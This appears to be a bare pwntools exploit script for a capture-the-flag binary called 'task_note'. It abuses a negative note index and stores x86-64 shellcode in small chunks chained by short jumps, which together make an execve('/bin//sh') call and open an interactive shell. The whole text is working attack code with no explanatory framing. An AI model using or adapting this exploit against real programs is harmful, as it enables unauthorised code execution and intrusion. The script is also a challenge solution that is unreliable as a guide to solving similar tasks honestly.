from pwn import *

p=process("./task_note")

def my_add(idx,content,size):
    p.recvuntil("your choice>>")
    p.sendline("1")
    p.sendlineafter("index:",str(idx))
    p.sendlineafter("size:",str(size))
    p.sendafter("content:",content)

def my_exit():
    p.recvuntil("your choice>>")
    p.sendline("5")

if __name__=="__main__":
    my_add(-7,"\x90\x31\xf6\x56\x56\xeb\x19\n",8)
    my_add(0,"\xbb\x2f\x62\x69\x6e\xeb\x19\n",8)
    my_add(1,"\x90\x90\x89\x1c\x24\xeb\x19\n",8)
    my_add(2,"\xbb\x2f\x2f\x73\x68\xeb\x19\n",8)
    my_add(3,"\x89\x5c\x24\x04\x90\xeb\x19\n",8)
    my_add(4,"\x48\x89\xe7\x6a\x3b\xeb\x19\n",8)
    my_add(5,"\x58\x48\x31\xd2\x0f\x05\n",7)
    my_exit()
    p.interactive()